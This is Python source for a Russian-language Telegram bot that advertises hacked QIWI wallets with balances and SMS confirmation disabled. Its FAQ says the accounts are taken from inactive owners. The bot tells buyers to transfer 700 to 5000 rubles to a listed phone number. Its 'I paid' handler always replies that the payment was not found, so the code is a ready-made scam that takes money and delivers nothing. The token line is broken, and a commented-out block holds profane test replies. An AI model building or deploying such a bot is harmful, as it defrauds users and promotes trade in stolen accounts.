import random 
import telebot
import parser
from telebot import types
import os

token = "os.getenv("TOKEN")"
bot = telebot.TeleBot(token)

@bot.message_handler(commands=['start', 'go'])
def start_handler(message):
    bot.send_message(message.chat.id, '''🤝 Привет , '''+ str(message.chat.first_name)+'''

💰 В этом боте Вы можете купить QIWI кошельки с балансом.

🔥 Все аккаунты полностью рабочие , осуществить денежные переводы на кошельки можно легко! 
Ведь SMS подтверждения отключены.''', reply_markup=markup)


@bot.message_handler(content_types=['text'])
def text_handler(message):
	text = message.text
	chat_id = message.chat.id
	a = str(random.randint(55632,98349))
	if text == 'Тех.поддержка 🆘':
		bot.send_message(chat_id, '''Если у вас возникли вопросы/предложения касательно нашего сервиса, обращайтесь.
Наши контакты:

Служба поддержки
@Qiwi_admin''', reply_markup=markup)
	elif text == 'Покупка аккаунта 🏦':
		bot.send_message(chat_id, 'Выберите способ 🎛' , reply_markup=bosskey())

	elif text == '🔙Назад':
		bot.send_message(chat_id,'Главное меню 🕹', reply_markup=markup)
	elif text == '🐥Qiwi Wallet':
		bot.send_message(chat_id,'🐥 Выберите пункт меню', reply_markup=sposob())


	elif text == '🐦Qiwi №1':
		bot.send_message(chat_id, '''QIWI Аккаунт №1 🐤

     🔅 Баланс: от 3000 рублей 

     🔅 Стоимость: 700 руб. 

     Выберите способ оплаты 🛍''', reply_markup=sposob1())
	elif text == '#1 Перейти к оплате через QIWI 🐥':
		bot.send_message(chat_id, '''Оплата QIWI Аккаунта №1 📦

📍 Переведите 700 рублей на Qiwi кошелёк 

👉🏻 +79223655903

♨️ Обязательно укажите комментарий к платежу 

👉🏻 '''+ a +'''

После успешной оплаты нажмите на кнопку "Я оплатил ⏳"''', reply_markup=oplata())

	elif text == '🐤Qiwi №2':
		bot.send_message(chat_id, '''QIWI Аккаунт №2 🐤

     🔅 Баланс: от 5000 рублей 

     🔅 Стоимость: 1500 руб. 

     Выберите способ оплаты 🛍''', reply_markup=sposob2())
	elif text == '#2 Перейти к оплате через QIWI 🐥':
		bot.send_message(chat_id, '''Оплата QIWI Аккаунта №2 📦

📍 Переведите 1500 рублей на Qiwi кошелёк 

👉🏻 +79223655903

♨️ Обязательно укажите комментарий к платежу 

👉🏻 '''+ a +'''

После успешной оплаты нажмите на кнопку "Я оплатил ⏳"''', reply_markup=oplata())


	elif text == '🐣Qiwi №3':
		bot.send_message(chat_id, '''QIWI Аккаунт №3 🐤

     🔅 Баланс: от 10000 рублей 

     🔅 Стоимость: 3500 руб. 

     Выберите способ оплаты 🛍''', reply_markup=sposob3())
	elif text == '#3 Перейти к оплате через QIWI 🐥':
		bot.send_message(chat_id, '''Оплата QIWI Аккаунта №3 📦

📍 Переведите 3500 рублей на Qiwi кошелёк 

👉🏻 +79223655903

♨️ Обязательно укажите комментарий к платежу 

👉🏻 '''+ a +'''

После успешной оплаты нажмите на кнопку "Я оплатил ⏳"''', reply_markup=oplata())


	elif text == '🐥Qiwi №4':
		bot.send_message(chat_id, '''QIWI Аккаунт №4 🐤

     🔅 Баланс: от 15000 рублей 

     🔅 Стоимость: 5000 руб. 

     Выберите способ оплаты 🛍''', reply_markup=sposob4())
	elif text == '#4 Перейти к оплате через QIWI 🐥':
		bot.send_message(chat_id, '''Оплата QIWI Аккаунта №4 📦

📍 Переведите 5000 рублей на Qiwi кошелёк 

👉🏻 +79223655903

♨️ Обязательно укажите комментарий к платежу 

👉🏻 '''+ a +'''

После успешной оплаты нажмите на кнопку "Я оплатил ⏳"''', reply_markup=oplata())











	elif text == 'Я оплатил⏳':
		bot.send_message(chat_id,'''Платёж не найден 💸

Проверьте наличие комментария к платежу или повторите попытку 🔄''', reply_markup=oplata())
	elif text == '🔙🔙Назад':
		bot.send_message(chat_id,'🐥 Выберите пункт меню',reply_markup=sposob())
	elif text == 'Ответы на вопросы ⁉️':
		bot.send_message(chat_id, '''🤷‍♂️ - Почему Вы продаете Qiwi кошельки с балансом?Лучше же себе все деньги забрать!

     👤- Мы с Вами согласны, лучше забрать себе. Но основная проблема в количестве, каждый день мы получаем много кошельков, самые жирные мы конечно же забираем, а остальные продаем. По сути мы остаемся в плюсе как и Вы.

     🤷‍♂️ - Каковы гарантии что меня не обманут?

     👤 - У нас уже более 100 продаж, ещё не один пользователь не был обманут. У нас все остаются довольными.

     🤷‍♂️ - Куда я могу вывести деньги?

     👤 - на Qiwi кошелёк, банковскую карту, а так же оплатить почти любой товар из интернета, а так же на другие электронные кошельки 

     🤷‍♂️ - Заходить в кошелёк безопасно?

     👤 - Владельцы не проявляли активность более месяца как минимум, на некоторых кошельках и более 6 месяцев. Мы рекомендуем делать перевод Qiwi ваучером, но это по вашему усмотрению.

     🤷‍♂️ - Что я получу после покупки?

     👤 - Логин, пароль от кошелька, логин пароль от почты, привязанной к кошельку.

     🤷‍♂️ - Как я сниму деньги без СМС подтверждения?

     👤 - На всех кошельках  отключены СМС подтверждения, то есть Вы сможете снять денежные средства без подтверждения по СМС.

     🤷‍♂️ - Какое количество кошельков я могу покупать в сутки ?

     👤- Не более 1 кошелька в день, за этим мы внимательно следим, в случае если Вы захотите взять более 1 кошелька бот не выдаст Вам данные, а Ваши деньги вернутся обратно Вам на счёт в течении 10 минут.''', reply_markup=markup)
	elif text == 'Как купить ❓':
		bot.send_message(chat_id, '''Для того что бы совершить покупку , достаточно зайти в раздел Покупка аккаунта 🏦 и выбрать интересующий вас аккаунт,  а дальше следовать инструкциям бота.

Все аккаунты полностью рабочие, выводить и оплачивать покупки Вы можете без проблем.''', reply_markup=markup)
	elif text == 'Бонусы 🎁':
		bot.send_message(chat_id, '''Аккаунт Qiwi №1 🐤

При покупке любого QIWI кошелька в подарок вы получите Qiwi №1 🐣 

После покупки аккаунта бот автоматически выдаст подарок 🤖''', reply_markup=markup)

def bosskey():
	markup = types.ReplyKeyboardMarkup(True)
	markup.row('🐥Qiwi Wallet', '🔙Назад')
	return markup
def sposob():
	markup = types.ReplyKeyboardMarkup(True)
	markup.row('🐦Qiwi №1', '🐤Qiwi №2')
	markup.row('🐣Qiwi №3', '🐥Qiwi №4')
	markup.row('🔙Назад')
	return markup
def sposob1():
	markup = types.ReplyKeyboardMarkup(True)
	markup.row('#1 Перейти к оплате через QIWI 🐥')
	markup.row('🔙🔙Назад')
	return markup
def sposob2():
	markup = types.ReplyKeyboardMarkup(True)
	markup.row('#2 Перейти к оплате через QIWI 🐥')
	markup.row('🔙🔙Назад')
	return markup	
def sposob3():
	markup = types.ReplyKeyboardMarkup(True)
	markup.row('#3 Перейти к оплате через QIWI 🐥')
	markup.row('🔙🔙Назад')
	return markup
def sposob4():
	markup = types.ReplyKeyboardMarkup(True)
	markup.row('#4 Перейти к оплате через QIWI 🐥')
	markup.row('🔙🔙Назад')
	return markup
def oplata():
	markup = types.ReplyKeyboardMarkup(True)
	markup.row('Я оплатил⏳')
	markup.row('🔙🔙Назад')
	return markup





markup = types.ReplyKeyboardMarkup(True)
markup.row('Покупка аккаунта 🏦')
markup.row('Бонусы 🎁', 'Как купить ❓')
markup.row('Ответы на вопросы ⁉️', 'Тех.поддержка 🆘')

if __name__ == '__main__':
    bot.polling(none_stop=True)




# @bot.message_handler(content_types=['text'])
# def text_handler(message):
#     text = message.text.lower()
#     chat_id = message.chat.id
#     a = str(random.randint(5563,9834))
#     if text == "привет":
#         bot.send_message(chat_id, 'Ваш уникальный код для входа в сеть:'+a+' введите его')
#     elif text == "как дела?":
#         bot.send_message(chat_id, 'Ахуенно, а у тебя сука ?')
#     else:
#         bot.send_message(chat_id, 'Сука я тебя не понял')    
# bot.polling()
